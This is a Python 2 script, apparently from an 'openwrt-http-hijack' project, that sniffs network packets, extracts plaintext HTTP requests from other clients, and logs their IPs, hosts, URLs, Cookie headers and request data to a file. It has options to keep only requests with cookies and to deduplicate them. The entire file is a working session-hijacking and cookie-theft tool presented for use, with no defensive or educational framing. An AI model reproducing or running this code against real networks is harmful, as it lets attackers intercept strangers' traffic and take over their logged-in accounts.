#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Date    : 2014-09-30 13:24:18
# @Author  : Robin
# @Link    : https://github.com/sintrb/openwrt-http-hijack
# @Version : 1.0
import hashlib
import pcap
import dpkt
import re
import time
import socket

def parseopts():
	import optparse
	parser = optparse.OptionParser(usage="%prog [optinos]")

	# 记录文件路径，默认hijack.rec
	parser.add_option("-r", "--record",
					action = "store",
					type = 'string',
					dest = "record_file",
					default = 'hijack.rec',
					help="The file path of the record"
					)

	# 客户端IP地址过滤正则，默认全部客户端
	parser.add_option("-i", "--ip",
					action = "store",
					type = 'string',
					default = '.*',
					dest = "ip_address",
					help = "Client IP address"
					)

	# 主机正则过滤，默认全部主机
	parser.add_option("--host",
					action = "store",
					type = 'string',
					dest = "host",
					default = '.*',
					help = "Specify if the target is an URL"
					)

	# 网络接口（eht0...）默认全部有效网卡
	parser.add_option("--interface",
					action = "store",
					type = 'string',
					dest = "interface",
					default = None,
					help = "Specify if the target is an URL"
					)

	# HTTP服务器端口过滤，默认不过滤
	parser.add_option("-p","--port",
					action = "store",
					type = 'int',
					dest = "port",
					default = 0,
					help = "Specify if the target is an URL"
					)

	# 是否记录请求数据，默认不记录
	parser.add_option("-D",
					action = "store_true",
					default = False,
					dest = "data",
					help = "Record request data"
					)

	# 是否记录Cookie，默认不记录
	parser.add_option("-C",
					action = "store_true",
					default = False,
					dest = "cookie",
					help = "Record cookie"
					)

	# 是否忽略没有Cookie的请求
	parser.add_option("-c",
					action = "store_true",
					default = False,
					dest = "icookie",
					help = "Ignore request when no cookie"
					)

	# 是否直接连唯一的客户端、主机以及Cookie请求
	parser.add_option("-u",
					action = "store_true",
					default = False,
					dest = "unique",
					help = "Unique md5(ip + host + cookie)"
					)

	# 是否先从记录文件载入唯一标识码
	parser.add_option("-l",
					action = "store_true",
					default = False,
					dest = "load_record",
					help = "Load from record file before hijack"
					)
	(options, args) = parser.parse_args()
	return options

class Hijack(object):
	'''
	Hijack HTTP Request
	'''
	def __init__(self, opts):
		print opts
		self.opts = opts
		self.pc = pcap.pcap()
		self.uniq = set()
		if self.opts.load_record:
			try:
				f = open(self.opts.record_file, 'r')
				print 'loading md5s...'
				for l in f.readlines():
					ss = l.split('\t')
					if len(ss)<4:
						continue
					ip = ss[1]
					host = ss[2]
					cookie = ss[4]
					src = ip + host + cookie
					md5s = hashlib.md5(src).hexdigest().upper()
					if not md5s in self.uniq:
						self.uniq.add(md5s)
					if not l:
						break
				f.close()
				print 'loaded %d md5s'%len(self.uniq)
			except:
				pass
		self.log = open(self.opts.record_file, 'a+')
		if self.opts.port:
			self.pc.setfilter('tcp dst port %s'%self.opts.port)
		else:
			self.pc.setfilter('tcp')

	def retext(self, p, s, d):
		res = re.findall(p,s)
		return res[0].strip() if res else d

	def rehead(self, data):
		p = self.retext('GET (\S+) HTTP/', data, None)
		h = self.retext('Host:\s*(\S+)\s*', data, None)
		c = self.retext('Cookie:(.*)\n', data, None)
		return (h,p,c)

	def record(self, ip, host, url, cookie, data):
		if self.opts.unique:
			src = ip + host + (cookie if cookie else '')
			md5s = hashlib.md5(src).hexdigest().upper()
			if md5s in self.uniq:
				return
			else:
				self.uniq.add(md5s)
		data = '' if not self.opts.data else data.strip().replace('\r', '').replace('\n', '&&')
		cookie = '' if (not self.opts.cookie or not cookie) else cookie
		r = '%s\t%s\t%s\t%s\t%s\t%s' % ( time.strftime('%Y-%m-%d %H:%M:%S'), ip, host, url, cookie, data )
		print r
		self.log.write(r)
		self.log.write('\r\n')
		self.log.flush()
		# ip host path data cookie
		

	def run(self):
		print 'start hijacking...'
		count = 0
		for t, d in self.pc:
			eth = dpkt.ethernet.Ethernet(d)
			if eth.data.__class__.__name__ == 'IP':
				ip = eth.data
				if ip.data.__class__.__name__ == 'TCP':
					tcp = ip.data
					data = tcp.data
					if len(data) and 'HTTP' in data and (self.opts.port==0 or tcp.dport==self.opts.port):
						ps = self.rehead(data)
						if ps[0] and ps[1]:
							ip = socket.inet_ntoa(ip.src)
							if re.match(self.opts.ip_address, ip):
								url = ''
								if tcp.dport==80:
									url = 'http://%s%s'%(ps[0], ps[1])
								else:
									url = 'http://%s:%d%s'%(ps[0],tcp.dport, ps[1])
								if ps[2] or not self.opts.icookie:
									self.record(ip, ps[0], url, ps[2], data)

if __name__ == '__main__':
	Hijack(parseopts()).run()




